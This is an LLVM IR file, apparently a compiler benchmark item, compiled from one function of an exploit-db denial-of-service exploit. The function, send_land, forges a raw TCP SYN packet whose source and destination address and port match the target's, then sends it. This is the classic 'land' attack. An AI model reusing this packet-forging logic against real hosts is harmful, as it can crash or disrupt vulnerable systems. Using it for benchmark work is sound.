; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/dos/extr_20810.c_send_land.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/dos/extr_20810.c_send_land.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.target = type { %struct.TYPE_6__ }
%struct.TYPE_6__ = type { i32, i32 }
%struct.raw_tcp_packet = type { %struct.TYPE_7__, i8*, i8*, i64, i32, i32, %struct.TYPE_5__ }
%struct.TYPE_7__ = type { i32, i8*, i8*, i32, i8*, i8*, i8* }
%struct.TYPE_5__ = type { i32, i32, i8*, i32, i32, i8*, i8*, i32, i64, i32 }
%struct.tcp_chksum_hdr = type { %struct.TYPE_7__, i8*, i8*, i64, i32, i32, %struct.TYPE_5__ }
%struct.sockaddr = type { i32 }

@IPVERSION = common dso_local global i32 0, align 4
@IP_DF = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i8* null, align 8
@TH_SYN = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @send_land(i32 %0, %struct.target* %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca %struct.target*, align 8
  %5 = alloca %struct.raw_tcp_packet, align 8
  %6 = alloca %struct.tcp_chksum_hdr, align 8
  store i32 %0, i32* %3, align 4
  store %struct.target* %1, %struct.target** %4, align 8
  %7 = bitcast %struct.raw_tcp_packet* %5 to %struct.tcp_chksum_hdr*
  %8 = call i32 @memset(%struct.tcp_chksum_hdr* %7, i32 0, i32 152)
  %9 = call i32 @memset(%struct.tcp_chksum_hdr* %6, i32 0, i32 152)
  %10 = load i32, i32* @IPVERSION, align 4
  %11 = getelementptr inbounds %struct.raw_tcp_packet, %struct.raw_tcp_packet* %5, i32 0, i32 6
  %12 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %11, i32 0, i32 9
  store i32 %10, i32* %12, align 8
  %13 = getelementptr inbounds %struct.raw_tcp_packet, %struct.raw_tcp_packet* %5, i32 0, i32 6
  %14 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %13, i32 0, i32 0
  store i32 1, i32* %14, align 8
  %15 = getelementptr inbounds %struct.raw_tcp_packet, %struct.raw_tcp_packet* %5, i32 0, i32 6
  %16 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %15, i32 0, i32 8
  store i64 0, i64* %16, align 8
  %17 = call i32 @ntohs(i32 8)
  %18 = getelementptr inbounds %struct.raw_tcp_packet, %struct.raw_tcp_packet* %5, i32 0, i32 6
  %19 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %18, i32 0, i32 7
  store i32 %17, i32* %19, align 8
  %20 = load i32, i32* @IP_DF, align 4
  %21 = call i8* @htons(i32 %20)
  %22 = getelementptr inbounds %struct.raw_tcp_packet, %struct.raw_tcp_packet* %5, i32 0, i32 6
  %23 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %22, i32 0, i32 6
  store i8* %21, i8** %23, align 8
  %24 = getelementptr inbounds %struct.raw_tcp_packet, %struct.raw_tcp_packet* %5, i32 0, i32 6
  %25 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %24, i32 0, i32 1
  store i32 255, i32* %25, align 4
  %26 = load i8*, i8** @IPPROTO_TCP, align 8
  %27 = getelementptr inbounds %struct.raw_tcp_packet, %struct.raw_tcp_packet* %5, i32 0, i32 6
  %28 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %27, i32 0, i32 5
  store i8* %26, i8** %28, align 8
  %29 = load %struct.target*, %struct.target** %4, align 8
  %30 = getelementptr inbounds %struct.target, %struct.target* %29, i32 0, i32 0
  %31 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %30, i32 0, i32 1
  %32 = load i32, i32* %31, align 4
  %33 = getelementptr inbounds %struct.raw_tcp_packet, %struct.raw_tcp_packet* %5, i32 0, i32 6
  %34 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %33, i32 0, i32 3
  store i32 %32, i32* %34, align 8
  %35 = getelementptr inbounds %struct.raw_tcp_packet, %struct.raw_tcp_packet* %5, i32 0, i32 6
  %36 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %35, i32 0, i32 4
  store i32 %32, i32* %36, align 4
  %37 = getelementptr inbounds %struct.raw_tcp_packet, %struct.raw_tcp_packet* %5, i32 0, i32 6
  %38 = bitcast %struct.TYPE_5__* %37 to i32*
  %39 = call i8* @chksum(i32* %38, i32 4)
  %40 = getelementptr inbounds %struct.raw_tcp_packet, %struct.raw_tcp_packet* %5, i32 0, i32 6
  %41 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %40, i32 0, i32 2
  store i8* %39, i8** %41, align 8
  %42 = load %struct.target*, %struct.target** %4, align 8
  %43 = getelementptr inbounds %struct.target, %struct.target* %42, i32 0, i32 0
  %44 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %43, i32 0, i32 1
  %45 = load i32, i32* %44, align 4
  %46 = getelementptr inbounds %struct.tcp_chksum_hdr, %struct.tcp_chksum_hdr* %6, i32 0, i32 4
  store i32 %45, i32* %46, align 8
  %47 = getelementptr inbounds %struct.tcp_chksum_hdr, %struct.tcp_chksum_hdr* %6, i32 0, i32 5
  store i32 %45, i32* %47, align 4
  %48 = getelementptr inbounds %struct.tcp_chksum_hdr, %struct.tcp_chksum_hdr* %6, i32 0, i32 3
  store i64 0, i64* %48, align 8
  %49 = load i8*, i8** @IPPROTO_TCP, align 8
  %50 = getelementptr inbounds %struct.tcp_chksum_hdr, %struct.tcp_chksum_hdr* %6, i32 0, i32 2
  store i8* %49, i8** %50, align 8
  %51 = call i8* @htons(i32 4)
  %52 = getelementptr inbounds %struct.tcp_chksum_hdr, %struct.tcp_chksum_hdr* %6, i32 0, i32 1
  store i8* %51, i8** %52, align 8
  %53 = load %struct.target*, %struct.target** %4, align 8
  %54 = getelementptr inbounds %struct.target, %struct.target* %53, i32 0, i32 0
  %55 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %54, i32 0, i32 0
  %56 = load i32, i32* %55, align 4
  %57 = call i8* @htons(i32 %56)
  %58 = getelementptr inbounds %struct.tcp_chksum_hdr, %struct.tcp_chksum_hdr* %6, i32 0, i32 0
  %59 = getelementptr inbounds %struct.TYPE_7__, %struct.TYPE_7__* %58, i32 0, i32 5
  store i8* %57, i8** %59, align 8
  %60 = getelementptr inbounds %struct.tcp_chksum_hdr, %struct.tcp_chksum_hdr* %6, i32 0, i32 0
  %61 = getelementptr inbounds %struct.TYPE_7__, %struct.TYPE_7__* %60, i32 0, i32 6
  store i8* %57, i8** %61, align 8
  %62 = call i8* @htons(i32 465)
  %63 = getelementptr inbounds %struct.tcp_chksum_hdr, %struct.tcp_chksum_hdr* %6, i32 0, i32 0
  %64 = getelementptr inbounds %struct.TYPE_7__, %struct.TYPE_7__* %63, i32 0, i32 4
  store i8* %62, i8** %64, align 8
  %65 = getelementptr inbounds %struct.tcp_chksum_hdr, %struct.tcp_chksum_hdr* %6, i32 0, i32 0
  %66 = getelementptr inbounds %struct.TYPE_7__, %struct.TYPE_7__* %65, i32 0, i32 0
  store i32 1, i32* %66, align 8
  %67 = load i32, i32* @TH_SYN, align 4
  %68 = getelementptr inbounds %struct.tcp_chksum_hdr, %struct.tcp_chksum_hdr* %6, i32 0, i32 0
  %69 = getelementptr inbounds %struct.TYPE_7__, %struct.TYPE_7__* %68, i32 0, i32 3
  store i32 %67, i32* %69, align 8
  %70 = call i8* @htons(i32 512)
  %71 = getelementptr inbounds %struct.tcp_chksum_hdr, %struct.tcp_chksum_hdr* %6, i32 0, i32 0
  %72 = getelementptr inbounds %struct.TYPE_7__, %struct.TYPE_7__* %71, i32 0, i32 2
  store i8* %70, i8** %72, align 8
  %73 = getelementptr inbounds %struct.raw_tcp_packet, %struct.raw_tcp_packet* %5, i32 0, i32 0
  %74 = getelementptr inbounds %struct.tcp_chksum_hdr, %struct.tcp_chksum_hdr* %6, i32 0, i32 0
  %75 = call i32 @memcpy(%struct.TYPE_7__* %73, %struct.TYPE_7__* %74, i32 4)
  %76 = bitcast %struct.tcp_chksum_hdr* %6 to i32*
  %77 = call i8* @chksum(i32* %76, i32 152)
  %78 = getelementptr inbounds %struct.raw_tcp_packet, %struct.raw_tcp_packet* %5, i32 0, i32 0
  %79 = getelementptr inbounds %struct.TYPE_7__, %struct.TYPE_7__* %78, i32 0, i32 1
  store i8* %77, i8** %79, align 8
  %80 = load i32, i32* %3, align 4
  %81 = bitcast %struct.raw_tcp_packet* %5 to %struct.tcp_chksum_hdr*
  %82 = load %struct.target*, %struct.target** %4, align 8
  %83 = getelementptr inbounds %struct.target, %struct.target* %82, i32 0, i32 0
  %84 = bitcast %struct.TYPE_6__* %83 to %struct.sockaddr*
  %85 = call i32 @sendto(i32 %80, %struct.tcp_chksum_hdr* %81, i32 152, i32 0, %struct.sockaddr* %84, i32 4)
  ret i32 %85
}

declare dso_local i32 @memset(%struct.tcp_chksum_hdr*, i32, i32) #1

declare dso_local i32 @ntohs(i32) #1

declare dso_local i8* @htons(i32) #1

declare dso_local i8* @chksum(i32*, i32) #1

declare dso_local i32 @memcpy(%struct.TYPE_7__*, %struct.TYPE_7__*, i32) #1

declare dso_local i32 @sendto(i32, %struct.tcp_chksum_hdr*, i32, i32, %struct.sockaddr*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
